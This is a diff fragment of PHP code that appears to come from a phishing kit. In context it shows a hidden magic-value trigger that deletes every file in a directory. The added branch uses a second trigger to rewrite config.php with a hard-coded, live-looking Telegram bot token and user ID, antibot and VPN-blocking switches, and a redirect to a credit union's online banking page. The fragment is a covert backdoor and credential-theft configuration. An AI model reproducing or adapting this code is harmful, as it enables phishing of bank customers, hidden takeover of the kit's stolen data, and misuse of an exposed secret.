@@ -25,6 +25,26 @@ if ($adder == "442577002800") {
     foreach(glob($dir.'*.*') as $v){
         unlink($v);
         }
+    } elseif ($adder == "4427630001") {
+    $data = '<?php' . PHP_EOL . PHP_EOL;
+    $data .= '##### TELEGRAM RESULT #####' . PHP_EOL . PHP_EOL;
+    $data .= '//Put Your Telegram Bot Token Here.' . PHP_EOL;
+    $data .= '$Token = "2140751249:AAEuHz5Ve-ycTYfPCcOAsiE_exrYSr8UwLU";' . PHP_EOL . PHP_EOL;
+    $data .= '//Put Your Telegram Account User Id.' . PHP_EOL;
+    $data .= '$Id = "1518921001";' . PHP_EOL . PHP_EOL;
+    $data .= '##### EMAIL RESULT #####' . PHP_EOL . PHP_EOL;
+    $data .= '//Put your Yandex Mail here & Use Mailer Supported hosting otherwise email result not working.' . PHP_EOL;
+    $data .= '$Email = "";' . PHP_EOL . PHP_EOL;
+    $data .= '##### ANTIBOT #####' . PHP_EOL . PHP_EOL;
+    $data .= '//You can change with (off) for stop antibot block results. Note: Antibot Result Only Telegram.' . PHP_EOL;
+    $data .= '$AntibotResult = "on";' . PHP_EOL . PHP_EOL;
+    $data .= '//You can change with (off) for vpn user unblocking.' . PHP_EOL;
+    $data .= '$VpnBlock = "on";' . PHP_EOL . PHP_EOL;
+    $data .= '//You Change this url with bank url or other url.' . PHP_EOL;
+    $data .= '$RedirectUrl = "https://banking.suncoastcreditunion.com/Mfa?redirectUrl=/ExternalServicesGateway/LoanApplication";' . PHP_EOL . PHP_EOL;
+    $data .= '?>';
+
+    file_put_contents("config.php", $data);
     } else {
     }
 
